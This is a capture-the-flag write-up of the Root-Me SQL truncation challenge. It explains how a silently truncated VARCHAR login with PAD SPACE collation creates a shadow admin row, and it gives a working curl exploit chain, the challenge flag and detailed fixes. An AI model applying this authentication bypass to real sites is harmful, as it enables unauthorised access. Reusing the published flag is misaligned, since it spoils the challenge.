# Root-Me — Web-Server / SQL Truncation (ch36)

- **Target:** http://challenge01.root-me.org/web-serveur/ch36/
- **Class:** SQL truncation — silent `VARCHAR(n)` truncation creating a shadow admin row
- **Author / date:** Geluchat, 1 May 2015
- **Goal:** retrieve access to the administration zone

## Flag

```
J41m3Qu4nD54Tr0nc
```

Byte-exact (`od` dump, no trailing whitespace):

```
V a l i d a t i o n   f l a g   :   J 4 1 m 3 Q u 4 n D 5 4 T r 0 n c
```

## Endpoints

| Path | Behaviour |
|---|---|
| `/index.php` | Home, links to the other two |
| `/register.php` | POST `login` + `password` → inserts a row |
| `/admin.php` | POST `password` **only** → admin check, returns the flag |

The schema is leaked in an HTML comment on `register.php`:

```sql
CREATE TABLE IF NOT EXISTS user(
    id INT NOT NULL AUTO_INCREMENT,
    login VARCHAR(12),      -- <-- the whole challenge
    password CHAR(32),
    PRIMARY KEY (id));
```

`login` is `VARCHAR(12)`. `admin` is 5 characters. That gap is the vulnerability.

## Analysis

Three properties combine:

**1. `login` is capped at 12 characters, and MySQL truncates silently.** In non-strict
mode MySQL raises only a warning when a value exceeds the column width — the INSERT
succeeds and the value is cut to 12 chars.

**2. MySQL's default collations are PAD SPACE.** For `VARCHAR` comparisons, trailing
spaces are ignored. So the stored value `'admin       '` (admin + 7 spaces) **compares
equal to `'admin'`**.

**3. The duplicate check runs on the raw input, before truncation.** Registering `admin`
is rejected:

```
User already in DB or password too short (8 chars min)
```

but registering a 13-character string whose first 12 characters are `admin` + spaces is
accepted, because the existence query compares the *untruncated* 13-char string and finds
no match. The `INSERT` then truncates it down to `'admin       '`.

The result is a **second row that is not the real admin row but compares equal to it**:

```
id | login            | password
---|------------------|-------------------------------
 1 | admin            | <unknown, the real admin hash>
 2 | admin       (sp) | md5('truncpw123')   <-- ours, from truncation
```

The admin query resolves the ambiguity for us. It must be something like:

```php
$r = mysqli_query($db, "SELECT * FROM user WHERE login='admin'
                        AND password='".md5($_POST['password'])."'");
```

Our row is the only one that satisfies **both** predicates — it matches `login='admin'`
thanks to PAD SPACE, and it matches our password because we chose it. So the query returns
exactly our row, and the password we know is accepted as the admin password.

## Exploit chain

```bash
B="http://challenge01.root-me.org/web-serveur/ch36"

# 1. Baseline: a normal registration does NOT grant admin
curl -s -X POST -d "login=bob&password=bobpassword" "$B/register.php"   # -> User saved
curl -s -X POST -d "password=bobpassword"           "$B/admin.php"      # -> (no message)

# 2. Truncation payload: 13 chars, first 12 = "admin" + 7 spaces
curl -s -X POST --data-urlencode "login=admin       1" \
               --data-urlencode "password=truncpw123" "$B/register.php"
# -> User saved

# 3. The truncated row now compares equal to 'admin' — log in with OUR password
curl -s -X POST --data-urlencode "password=truncpw123" "$B/admin.php"
# -> Well done ! Flag de validation / Validation flag : J41m3Qu4nD54Tr0nc
```

The payload is `admin` + 7 spaces + any filler (`1`, `zz`, …). What matters is that the
string is **> 12 characters** (so truncation fires) and that characters 1–12 are
`admin` followed by spaces (so the result compares equal to `admin`).

## Results / controls

| # | Register `login` | len | Register result | `admin.php` with our pw |
|---|---|---|---|---|
| 1 | `admin` | 5 | `User already in DB…` | — |
| 2 | `admin       1` | 13 | `User saved` | **flag** |
| 3 | `admin        zz` | 14 | `User saved` | **flag** |
| 4 | `bob` | 3 | `User saved` | (no message) |
| 5 | `adminx` | 6 | `User saved` | (no message) |
| 6 | `shortpwuser`, pw `abc` | 11 | `…password too short (8 chars min)` | — |

And against `admin.php` directly:

| Password | Result |
|---|---|
| `truncpw123` (ours) | **flag** |
| `truncpw124` (off-by-one) | (no message) |
| `admin` | (no message) |
| `bobpassword` (a valid non-admin account) | (no message) |

Controls 4 and 5 are the important ones: a normal registration and a *near-miss* name
(`adminx`) both fail. Only a string that truncates to exactly `admin` + padding works —
which rules out "registration alone grants admin" and confirms the truncation is doing the
work. Control 6 confirms the 8-character password minimum is a separate rule that the
payload also has to satisfy.

## Root cause

1. **Silent truncation.** `VARCHAR(12)` with non-strict SQL mode means an over-long value
   is quietly cut instead of rejected. The application never learns that the value it
   validated is not the value it stored — a classic *validate-then-store* mismatch
   (TOCTOU on data shape).
2. **The uniqueness check is not the storage operation.** The duplicate check compares the
   raw input; the INSERT compares nothing. Any transformation between those two points
   (truncation, normalisation, case folding, Unicode NFC) creates a window.
3. **PAD SPACE collation makes the truncated value collide with the target.** `'admin '`
   `=` `'admin'` for comparison purposes, so the shadow row impersonates the real one.
4. **The admin lookup keys on `login`.** `WHERE login='admin'` is satisfied by *any* row
   that compares equal — including one the attacker created.
5. **MD5 for passwords** (`CHAR(32)`), so the "hash" is trivially reversible/forgeable and
   offers no protection once the row is attacker-controlled.

## Fix

- **Validate length against the column, and reject over-long input** instead of letting the
  database truncate it:

  ```php
  $login = (string) $_POST['login'];
  if ($login === '' || mb_strlen($login) > 12) {
      exit('Invalid login length');
  }
  ```

- **Use strict SQL mode.** `SET sql_mode='STRICT_ALL_TABLES'` (or `STRICT_TRANS_TABLES`)
  turns the silent truncation into an error, which is the real root-cause fix:

  ```
  ERROR 1406 (22001): Data too long for column 'login' at row 1
  ```

- **Enforce uniqueness in the database**, on a canonical form of the value, and let the
  database be the arbiter:

  ```sql
  ALTER TABLE user ADD UNIQUE KEY uniq_login (login);
  ```

  With a UNIQUE index the second insert fails outright — the attack has nowhere to go.
  (Note this is *not* sufficient on its own if the collation is PAD SPACE and the app still
  truncates; combine with strict mode.)

- **Normalise before both checking and storing** — trim trailing whitespace, then compare.
  Never validate one form and store another.
- **Don't look up privileged accounts by a user-supplied-equivalent key.** Query by `id`,
  and check the role/privilege flag explicitly rather than assuming `login='admin'` is
  sufficient authorisation.
- **Replace MD5** with `password_hash()` / Argon2id, and widen the column to hold the
  modern hash (60+ chars).

## Generalisation

SQL truncation is one instance of **validate-then-store divergence**. The same shape
appears whenever a transformation sits between the check and the write:

| Transformation | Example |
|---|---|
| Truncation | this challenge (`VARCHAR(n)`) |
| Case folding | unique index on `login` with a case-insensitive collation |
| Whitespace padding | `CHAR(n)` right-pads; `'a'` and `'a   '` collide |
| Unicode normalisation | `admin` vs `admın` (dotless i) under NFKC/NFKD |
| Trailing-dot/space stripping | Windows filenames, some LDAP/AD backends |
| Encoding coercion | latin1→utf8 round-trips that mangle bytes |

Detection heuristic: find every column with a length limit, then ask *"what does the
application check, and what does the database store?"* If those two differ, you have a
truncation bug — and if the column participates in an authorisation decision, you have an
authentication bypass.
